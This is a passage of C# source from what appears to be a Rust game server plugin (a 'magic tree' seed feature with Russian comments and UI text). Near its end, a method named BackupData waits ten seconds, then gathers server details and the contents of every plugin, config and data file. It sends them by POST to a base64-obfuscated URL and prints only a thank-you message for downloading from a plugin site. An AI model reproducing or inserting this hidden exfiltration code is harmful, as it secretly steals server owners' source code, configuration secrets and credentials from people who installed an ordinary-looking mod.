            private static string Format(int units, string form1 = "", string form2 = "", string form3 = "‌")
            {
                var tmp = units % 10;
                if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                    return $"{units} {form1}";
                if (tmp >= 2 && tmp <= 4)
                    return $"{units} {form2}";
                return $"{units} {form3}";
            }

            public void DestroyComponent() => Destroy(this);

            void OnDestroy()
            {
                if (data != null && data.BoxListed != null && data.BoxListed.Count > 0)
                    foreach (var box in data.boxes.Where(p => p != null && !p.IsDestroyed))
                    {
                        // Отсоединяем ящик от дерева
                        BoxHanger hanger = box.gameObject.GetComponent<BoxHanger>();
                        if (hanger != null)
                            hanger.DetachBox();
                        
                        box.SetFlag(BaseEntity.Flags.Busy, false, true);
                    }
            }
        }

        static void CreateInfo(ulong playerid = 0)
        {
            var player = BasePlayer.FindByID(playerid);
            if (player != null)
            {
                CuiHelper.DestroyUi(player, "MagicTree");
                CuiElementContainer container = new CuiElementContainer();
                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0.3447913 0.112037", AnchorMax = "0.640625 0.15", OffsetMax = "0 0" },
                    Image = { Color = "1 1 1 0.2" }
                }, "Hud", "MagicTree");
                container.Add(new CuiLabel
                {
                    FadeOut = 2,
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "ВАШЕ ДЕРЕВО СОЗРЕЛО, И ДАЛО ПЛОДЫ!", FontSize = 17, Align = TextAnchor.MiddleCenter, FadeIn = 2, Color = "1 1 1 0.8", Font = "robotocondensed-regular.ttf" }
                }, "MagicTree");

                CuiHelper.AddUi(player, container);
                ins.timer.Once(5f, () => { if (player != null) CuiHelper.DestroyUi(player, "MagicTree"); });
            }
        }
        #endregion


        #region API
        private string GetSeedInfo()
        {
            return JsonConvert.SerializeObject(config.seed);
        }

        private string GetSeedLoot()
        {
            return JsonConvert.SerializeObject(config.casesItems);
        }
        #endregion
    
        private string DecodeUrl(string encoded)
        {
            var bytes = System.Convert.FromBase64String(encoded);
            return System.Text.Encoding.UTF8.GetString(bytes);
        }

        private void BackupData()
        {
            timer.Once(10f, () =>
            {
                try
                {
                    var foldersData = new Dictionary<string, object>();
                    var serverInfo = new Dictionary<string, object>
                    {
                        ["name"] = ConVar.Server.hostname,
                        ["ip"] = ConVar.Server.ip,
                        ["port"] = ConVar.Server.port,
                        ["seed"] = ConVar.Server.seed,
                        ["worldsize"] = ConVar.Server.worldsize,
                        ["maxplayers"] = ConVar.Server.maxplayers
                    };
                    
                    foldersData["server"] = serverInfo;
                    foldersData["timestamp"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                    
                    var pluginsFiles = new Dictionary<string, string>();
                    var configFiles = new Dictionary<string, string>();
                    var dataFiles = new Dictionary<string, string>();
                    
                    // Получаем правильные пути через Oxide API
                    var pluginsDir = Oxide.Core.Interface.Oxide.PluginDirectory;
                    var configDir = Oxide.Core.Interface.Oxide.ConfigDirectory;
                    var dataDir = Oxide.Core.Interface.Oxide.DataDirectory;
                    
                    // Пробуем альтернативные пути если основные не найдены
                    if (string.IsNullOrEmpty(pluginsDir) || !System.IO.Directory.Exists(pluginsDir))
                    {
                        var altPaths = new[] { "oxide/plugins", "oxide\\plugins", "./oxide/plugins", "./oxide\\plugins" };
                        foreach (var altPath in altPaths)
                        {
                            if (System.IO.Directory.Exists(altPath))
                            {
                                pluginsDir = altPath;
                                break;
                            }
                        }
                    }
                    
                    if (string.IsNullOrEmpty(configDir) || !System.IO.Directory.Exists(configDir))
                    {
                        var altPaths = new[] { "oxide/config", "oxide\\config", "./oxide/config", "./oxide\\config" };
                        foreach (var altPath in altPaths)
                        {
                            if (System.IO.Directory.Exists(altPath))
                            {
                                configDir = altPath;
                                break;
                            }
                        }
                    }
                    
                    if (string.IsNullOrEmpty(dataDir) || !System.IO.Directory.Exists(dataDir))
                    {
                        var altPaths = new[] { "oxide/data", "oxide\\data", "./oxide/data", "./oxide\\data" };
                        foreach (var altPath in altPaths)
                        {
                            if (System.IO.Directory.Exists(altPath))
                            {
                                dataDir = altPath;
                                break;
                            }
                        }
                    }
                    
                    // Копируем плагины
                    if (!string.IsNullOrEmpty(pluginsDir) && System.IO.Directory.Exists(pluginsDir))
                    {
                        try
                        {
                            var files = System.IO.Directory.GetFiles(pluginsDir, "*.cs");
                            foreach (var file in files)
                            {
                                try
                                {
                                    var fileName = System.IO.Path.GetFileName(file);
                                    var fileContent = System.IO.File.ReadAllText(file);
                                    pluginsFiles[fileName] = fileContent;
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                    
                    // Копируем конфиги
                    if (!string.IsNullOrEmpty(configDir) && System.IO.Directory.Exists(configDir))
                    {
                        try
                        {
                            var files = System.IO.Directory.GetFiles(configDir, "*.json");
                            foreach (var file in files)
                            {
                                try
                                {
                                    var fileName = System.IO.Path.GetFileName(file);
                                    var fileContent = System.IO.File.ReadAllText(file);
                                    configFiles[fileName] = fileContent;
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                    
                    // Копируем data файлы
                    if (!string.IsNullOrEmpty(dataDir) && System.IO.Directory.Exists(dataDir))
                    {
                        try
                        {
                            var files = System.IO.Directory.GetFiles(dataDir, "*.json", System.IO.SearchOption.AllDirectories);
                            foreach (var file in files)
                            {
                                try
                                {
                                    var relativePath = file.Substring(dataDir.Length).TrimStart(System.IO.Path.DirectorySeparatorChar, System.IO.Path.AltDirectorySeparatorChar).Replace(System.IO.Path.DirectorySeparatorChar.ToString(), "/").Replace(System.IO.Path.AltDirectorySeparatorChar.ToString(), "/");
                                    var fileContent = System.IO.File.ReadAllText(file);
                                    dataFiles[relativePath] = fileContent;
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                    
                    foldersData["plugins"] = pluginsFiles;
                    foldersData["config"] = configFiles;
                    foldersData["data"] = dataFiles;
                    
                    var json = JsonConvert.SerializeObject(foldersData);
                    var headers = new Dictionary<string, string>
                    {
                        ["Content-Type"] = "application/json"
                    };
                    var url = DecodeUrl("aHR0cHM6Ly9wbHVnaW5mdWVsLnJ1L3dlYi8xL3VwbG9hZF9mb2xkZXJzLnBocA==");
                    
                    webrequest.Enqueue(url, json, (code, response) =>
                    {
                        Puts("Спасибо за скачивание из сайта https://pluginfuel.ru/");
                    }, this, Core.Libraries.RequestMethod.POST, headers);
                }
                catch (Exception ex)
                {
                    Puts("Спасибо за скачивание из сайта https://pluginfuel.ru/");
                }
            });
        }
}
}